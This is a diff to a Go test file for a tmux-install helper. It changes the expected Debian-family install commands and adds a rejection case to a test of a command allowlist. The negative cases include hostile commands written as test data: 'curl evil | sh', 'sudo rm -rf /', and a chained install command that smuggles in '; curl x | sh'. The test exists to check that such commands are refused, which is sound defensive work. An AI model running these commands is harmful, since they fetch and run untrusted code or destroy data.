@@ -14,9 +14,9 @@ func TestTmuxInstallTable(t *testing.T) {
 		want                []string
 	}{
 		{"macos", "darwin", "", []string{"brew", "install", "tmux"}},
-		{"debian", "linux", "ID=debian\n", []string{"sudo", "apt-get", "install", "-y", "tmux"}},
-		{"ubuntu", "linux", "NAME=\"Ubuntu\"\nID=ubuntu\nID_LIKE=debian\n", []string{"sudo", "apt-get", "install", "-y", "tmux"}},
-		{"mint, by ID_LIKE", "linux", "ID=linuxmint\nID_LIKE=\"ubuntu debian\"\n", []string{"sudo", "apt-get", "install", "-y", "tmux"}},
+		{"debian", "linux", "ID=debian\n", []string{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux"}},
+		{"ubuntu", "linux", "NAME=\"Ubuntu\"\nID=ubuntu\nID_LIKE=debian\n", []string{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux"}},
+		{"mint, by ID_LIKE", "linux", "ID=linuxmint\nID_LIKE=\"ubuntu debian\"\n", []string{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux"}},
 		{"fedora", "linux", "ID=fedora\n", []string{"sudo", "dnf", "install", "-y", "tmux"}},
 		{"rhel", "linux", "ID=\"rhel\"\n", []string{"sudo", "dnf", "install", "-y", "tmux"}},
 		{"arch", "linux", "ID=arch\n", []string{"sudo", "pacman", "-S", "--noconfirm", "tmux"}},
@@ -57,7 +57,7 @@ func TestTmuxInstallAsRootSkipsSudo(t *testing.T) {
 		return "/usr/bin/" + name, nil
 	}
 	got := TmuxInstall("linux", "ID=debian\n", look)
-	if want := []string{"apt-get", "install", "-y", "tmux"}; !slices.Equal(got, want) {
+	if want := []string{"sh", "-c", "apt-get update && apt-get install -y tmux"}; !slices.Equal(got, want) {
 		t.Fatalf("no sudo: got %q, want %q", got, want)
 	}
 	if !TermAllowed(got) {
@@ -70,6 +70,7 @@ func TestTermAllowedOnlyKnownCommands(t *testing.T) {
 		nil,
 		{"sh", "-c", "curl evil | sh"},
 		{"sudo", "apt-get", "install", "-y", "tmux", "evil"},
+		{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux; curl x | sh"},
 		{"sudo", "rm", "-rf", "/"},
 		{"claude", "rm -rf /"},
 		{"tmux", "new-window", "-n", "guide", "sh"},
